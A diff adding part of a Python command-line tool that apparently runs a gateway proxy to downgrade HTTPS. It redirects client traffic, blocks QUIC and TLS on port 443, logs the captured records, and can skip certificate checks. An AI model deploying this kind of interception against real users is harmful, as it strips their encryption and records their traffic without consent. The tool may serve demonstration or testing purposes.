+            for _ in range(20):
+                if not pid_alive(pid):
+                    break
+                time.sleep(0.1)
+            if not pid_alive(pid):
+                break
+    try:
+        os.remove(PID_FILE)
+    except OSError:
+        pass
+    if not quiet:
+        print('https downgrade off (%d rule group(s) removed)' % removed)
+
+
+def count_records():
+    try:
+        with open(JSONL_FILE, 'rb') as handle:
+            return handle.read().count(b'\n')
+    except OSError:
+        return 0
+
+
+def cmd_status(as_json=False):
+    state = load_state()
+    port = int(state.get('port') or DEFAULT_PORT)
+    pid = read_pid()
+    listening = port_open(port)
+    gw = gateway_ip()
+    rules = {
+        'redirect': rule_present(redirect_rule(gw, port)),
+        'quic_block': rule_present(quic_rule()),
+        'tls_block': rule_present(tls_rule()),
+    }
+    data = {
+        'running': pid_alive(pid) and listening,
+        'pid': pid if pid_alive(pid) else 0,
+        'port': port,
+        'mode': state.get('mode') or 'block',
+        'listen': listening,
+        'rules': rules,
+        'blocked_tls': blocked_tls_count(),
+        'prereqs': {
+            'internet': passthrough_on(gw),
+            'dns_off': not os.path.exists(FLAG_DNS),
+            'portal_off': not os.path.exists(FLAG_PORTAL),
+        },
+        'log': LOG_FILE,
+        'records': count_records(),
+        'gateway': gw,
+    }
+    if as_json:
+        print(json.dumps(data))
+        return data
+    print('running:     %s' % ('yes' if data['running'] else 'no'))
+    print('pid / port:  %s / %d' % (data['pid'] or '-', port))
+    print('https mode:  %s' % data['mode'])
+    print('rules:       redirect=%s quic=%s tls=%s' % (
+        rules['redirect'], rules['quic_block'], rules['tls_block']))
+    print('blocked TLS: %d' % data['blocked_tls'])
+    print('prereqs:     internet=%s dns_off=%s portal_off=%s' % (
+        data['prereqs']['internet'], data['prereqs']['dns_off'],
+        data['prereqs']['portal_off']))
+    return data
+
+
+def cmd_log(as_json=False, lines=100):
+    if as_json:
+        print(json.dumps(read_records(lines)))
+        return
+    try:
+        with open(LOG_FILE, encoding='utf-8', errors='replace') as handle:
+            print(''.join(handle.readlines()[-lines:]))
+    except OSError:
+        print('no log yet (%s)' % LOG_FILE)
+
+
+def cmd_clear():
+    require_root()
+    cleared = []
+    for path in (LOG_FILE, JSONL_FILE):
+        try:
+            with open(path, 'w'):
+                pass
+            cleared.append(os.path.basename(path))
+        except OSError:
+            pass
+    print('cleared: %s' % (', '.join(cleared) or 'nothing'))
+
+
+def cmd_serve(port, mode, insecure, probes, verbose):
+    state = ProxyState(port, mode, answer_probes=probes, insecure=insecure,
+                       verbose=verbose, gateway=gateway_ip())
+    try:
+        server = ProxyServer(('0.0.0.0', port), ProxyHandler)
+    except OSError as exc:
+        sys.stderr.write('%s: cannot listen on %d: %s\n' % (PROG, port, exc))
+        raise SystemExit(4)
+    server.state = state
+    try:
+        os.makedirs(os.path.dirname(PID_FILE), exist_ok=True)
+        with open(PID_FILE, 'w') as handle:
+            handle.write(str(os.getpid()))
+    except OSError:
+        pass
+
+    def stop(_signum, _frame):
+        threading.Thread(target=server.shutdown, daemon=True).start()
+
+    signal.signal(signal.SIGTERM, stop)
+    signal.signal(signal.SIGINT, stop)
+    print('%s: listening on 0.0.0.0:%d (https=%s, probes=%s)'
+          % (PROG, port, mode, 'on' if probes else 'off'), flush=True)
+    try:
+        server.serve_forever(poll_interval=0.4)
+    finally:
+        server.server_close()
+        try:
+            if read_pid() == os.getpid():
+                os.remove(PID_FILE)
+        except OSError:
+            pass
+
+
+def main(argv=None):
+    parser = argparse.ArgumentParser(prog=PROG, description=__doc__.splitlines()[0])
+    parser.add_argument('command', nargs='?', default='status',
+                        choices=['on', 'off', 'status', 'log', 'clear', 'serve'])
+    parser.add_argument('--https', dest='mode', default=None,
+                        choices=['block', 'allow'],
+                        help='block tcp/443 (default, shows the failure) or '
+                             'allow it (encrypted, invisible)')
+    parser.add_argument('--port', type=int, default=None)
+    parser.add_argument('--json', action='store_true')
+    parser.add_argument('--lines', type=int, default=100)
+    parser.add_argument('--insecure', action='store_true',
+                        help='do not verify upstream certificates')
+    parser.add_argument('--no-probe-answer', dest='probes', action='store_false',
+                        default=None)
+    parser.add_argument('--verbose', action='store_true')
+    args = parser.parse_args(argv)
+
+    saved = load_state()
+    mode = args.mode or saved.get('mode') or 'block'
+    port = args.port or int(saved.get('port') or DEFAULT_PORT)
+    probes = saved.get('probes', True) if args.probes is None else args.probes
+
+    if args.command == 'on':
+        cmd_on(mode, port, args.insecure, probes)
+    elif args.command == 'off':
+        cmd_off()
+    elif args.command == 'status':
+        cmd_status(args.json)
+    elif args.command == 'log':
+        cmd_log(args.json, args.lines)
+    elif args.command == 'clear':
+        cmd_clear()
+    elif args.command == 'serve':
+        cmd_serve(port, mode, args.insecure, probes, args.verbose)
+    return 0
+
+
+if __name__ == '__main__':
+    sys.exit(main())
